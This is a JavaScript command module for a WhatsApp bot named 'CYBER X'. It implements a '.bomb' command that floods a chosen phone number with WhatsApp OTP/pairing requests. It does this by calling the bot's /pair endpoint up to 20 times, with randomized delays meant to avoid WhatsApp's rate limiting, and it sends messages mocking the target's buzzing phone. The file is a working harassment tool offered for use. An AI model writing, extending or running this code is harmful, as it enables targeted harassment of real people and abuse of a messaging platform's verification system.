// commands/bomb.js — CYBER X Bomb Command 💣
// Calls the bot's own /pair endpoint repeatedly to trigger
// WhatsApp OTP messages to the target number.
//
// Usage:
//   .bomb X10                → reply to someone
//   .bomb @user X10          → mention in group
//   .bomb 2348XXXXXXXXX X10  → direct number
//
// OWNER ONLY — multi-session aware (any linked session owner can use it)

const { checkIsOwnerOnly } = require("../lib/isAdmin")
const https = require("https")
const http  = require("http")

const delay = ms => new Promise(r => setTimeout(r, ms))

// ── Auto react helper ─────────────────────────────────────────────────────────
async function react(sock, msg, emoji) {
  try {
    await sock.sendMessage(msg.key.remoteJid, {
      react: { text: emoji, key: msg.key }
    })
  } catch {}
}

// ── Hit the bot's own /pair endpoint to trigger WhatsApp OTP ─────────────────
// This is the same flow your pairing website uses — it works on any
// already-connected session because it goes through the HTTP route,
// not through sock.requestPairingCode() which needs an unregistered sock.
function hitPairEndpoint(phone) {
  return new Promise((resolve) => {
    const BOT_URL  = process.env.RENDER_EXTERNAL_URL || `http://localhost:${process.env.PORT || 3000}`
    const isHttps  = BOT_URL.startsWith("https")
    const mod      = isHttps ? https : http
    const body     = JSON.stringify({ phone })
    const urlObj   = new URL(BOT_URL + "/pair")

    const options = {
      hostname: urlObj.hostname,
      port:     urlObj.port || (isHttps ? 443 : 80),
      path:     urlObj.pathname,
      method:   "POST",
      headers:  {
        "Content-Type":   "application/json",
        "Content-Length": Buffer.byteLength(body),
      },
      timeout: 12000,
    }

    const req = mod.request(options, (res) => {
      let data = ""
      res.on("data", c => data += c)
      res.on("end", () => {
        try {
          const parsed = JSON.parse(data)
          // success if we got a code back or status true
          resolve({ ok: !!(parsed.code || parsed.pairingCode || parsed.status), raw: parsed })
        } catch {
          resolve({ ok: res.statusCode < 400, raw: {} })
        }
      })
    })

    req.on("error",   () => resolve({ ok: false, raw: {} }))
    req.on("timeout", () => { req.destroy(); resolve({ ok: false, raw: {} }) })
    req.write(body)
    req.end()
  })
}

module.exports = {
  bomb: {
    category: "OWNER",
    desc: "Bomb a number with WhatsApp OTP requests 💣 (Owner only)",
    usage: ".bomb X10 | .bomb @user X10 | .bomb number X10",
    ownerOnly: true,

    async handler(sock, msg, args, lib) {
      const from      = msg.key.remoteJid
      const sender    = msg.key.participant || msg.key.remoteJid
      const senderAlt = msg.key.participantPn || null

      // ── Owner only gate — works for ANY linked session owner ──────
      if (!checkIsOwnerOnly(sender, senderAlt)) {
        await react(sock, msg, "🚫")
        return sock.sendMessage(from, {
          text: `╭━━━〔 💣 *CYBER X BOMB* 〕━━━╮\n┃\n┃ 🚫 *Owner Only Command!*\n┃\n┃ Only Charles can use this 😏\n┃\n╰━━━━━━━━━━━━━━━━━━━━━━━╯\n\n© 𝕮𝖄𝕭𝙀𝙍 𝖃 ™`
        }, { quoted: msg })
      }

      // ── React immediately — owner confirmed ✅ ────────────────────
      await react(sock, msg, "💣")

      // ── Parse args ────────────────────────────────────────────────
      let targetPhone = null
      let times       = 5

      const quoted    = msg.message?.extendedTextMessage?.contextInfo?.participant
        || msg.message?.extendedTextMessage?.contextInfo?.remoteJid
      const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]
      const rawArgs   = args.join(" ").trim()

      // Extract X<n> times — cap at 20 to avoid WhatsApp rate limiting your bot
      const timesMatch = rawArgs.match(/[xX](\d+)/i)
      if (timesMatch) times = Math.min(parseInt(timesMatch[1]), 20)

      // Extract phone number — prefer direct number, then mention, then reply
      const phoneMatch = rawArgs.match(/(\d{7,15})/)
      if (phoneMatch)     targetPhone = phoneMatch[1]
      else if (mentioned) targetPhone = mentioned.replace("@s.whatsapp.net", "").replace(/:\d+$/, "")
      else if (quoted)    targetPhone = (quoted || "").replace("@s.whatsapp.net", "").replace("@g.us", "").replace(/:\d+$/, "").replace(/\D/g, "")

      // Clean the number — digits only, no +
      if (targetPhone) targetPhone = targetPhone.replace(/\D/g, "")

      if (!targetPhone || targetPhone.length < 7) {
        await react(sock, msg, "⚠️")
        return sock.sendMessage(from, {
          text: `╭━━━〔 💣 *CYBER X BOMB* 〕━━━╮\n┃\n┃ ⚠ *No valid target found!*\n┃\n┃ Usage:\n┃ • Reply + *.bomb X10*\n┃ • *.bomb @user X10*\n┃ • *.bomb 2348xxx X10*\n┃\n┃ Max rounds: 20\n┃\n╰━━━━━━━━━━━━━━━━━━━━━━━╯`
        }, { quoted: msg })
      }

      if (times < 1) times = 1

      // ── Confirm launch ────────────────────────────────────────────
      await sock.sendMessage(from, {
        text: `╭━━━〔 💣 *CYBER X BOMB* 〕━━━╮\n┃\n┃ 🎯 *Target:* +${targetPhone}\n┃ 💥 *Rounds:* ${times}x\n┃ ⏱ *Status:* Launching...\n┃\n┃ 😂 Their phone won't stop buzzing!\n┃\n╰━━━━━━━━━━━━━━━━━━━━━━━╯\n\n© 𝕮𝖄𝕭𝙀𝙍 𝖃 ™`
      }, { quoted: msg })

      // ── Fire the bomb 💣 ──────────────────────────────────────────
      let success = 0
      let failed  = 0

      for (let i = 1; i <= times; i++) {
        const result = await hitPairEndpoint(targetPhone)
        if (result.ok) {
          success++
          console.log(`[BOMB] 💣 Round ${i}/${times} ✅ → +${targetPhone}`)
        } else {
          failed++
          console.log(`[BOMB] ✗ Round ${i}/${times} ❌ → +${targetPhone}`)
        }

        // React to show progress every 5 hits or on last round
        if (i % 5 === 0 || i === times) {
          await react(sock, msg, success > failed ? "💥" : "💀")
        }

        // Delay between hits — randomized so WhatsApp doesn't rate-limit
        if (i < times) await delay(2000 + Math.floor(Math.random() * 1500))
      }

      // ── Final react ───────────────────────────────────────────────
      await react(sock, msg, success === times ? "✅" : failed === times ? "❌" : "⚡")

      // ── Result message ────────────────────────────────────────────
      await sock.sendMessage(from, {
        text: `╭━━━〔 💣 *BOMB COMPLETE* 〕━━━╮\n┃\n┃ 🎯 *Target:* +${targetPhone}\n┃ ✅ *Hit:* ${success}/${times}\n┃ ❌ *Missed:* ${failed}/${times}\n┃ 📊 *Rate:* ${Math.round((success/times)*100)}%\n┃\n┃ 😭 Their phone is crying rn 💀\n┃\n╰━━━━━━━━━━━━━━━━━━━━━━━╯\n\n© 𝕮𝖄𝕭𝙀𝙍 𝖃 ™`
      }, { quoted: msg })
    }
  }
}
